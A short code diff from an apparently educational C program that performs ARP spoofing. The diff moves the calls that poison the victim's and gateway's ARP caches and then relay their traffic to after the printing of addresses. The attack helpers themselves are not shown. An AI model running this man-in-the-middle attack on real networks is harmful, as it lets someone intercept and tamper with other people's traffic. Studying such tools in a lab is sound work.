@@ -44,10 +44,6 @@ int main(int argc, char *argv[])
 	reply(dev, pcap, gate_mac, gate_ip);
 	request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, victim_ip, 0);
 	reply(dev, pcap, victim_mac, victim_ip);
-	request(dev, pcap, victim_mac, attacker_mac, attacker_mac, gate_ip, victim_mac, victim_ip, 1);
-	request(dev, pcap, gate_mac, attacker_mac, attacker_mac, victim_ip, gate_mac, gate_ip, 1);
-	relay(dev, pcap, attacker_mac, victim_mac, gate_mac, victim_ip, gate_ip);
-
 	printf("attacker ip addr : ");
 	print_ip(attacker_ip);
 	printf("sender ip addr : ");
@@ -61,6 +57,10 @@ int main(int argc, char *argv[])
 	print_mac(victim_mac);
 	printf("target mac addr : ");
 	print_mac(gate_mac);
+
+	request(dev, pcap, victim_mac, attacker_mac, attacker_mac, gate_ip, victim_mac, victim_ip, 1);
+	request(dev, pcap, gate_mac, attacker_mac, attacker_mac, victim_ip, gate_mac, gate_ip, 1);
+	relay(dev, pcap, attacker_mac, victim_mac, gate_mac, victim_ip, gate_ip);
 
 	return 0;
 	pcap_close(pcap);
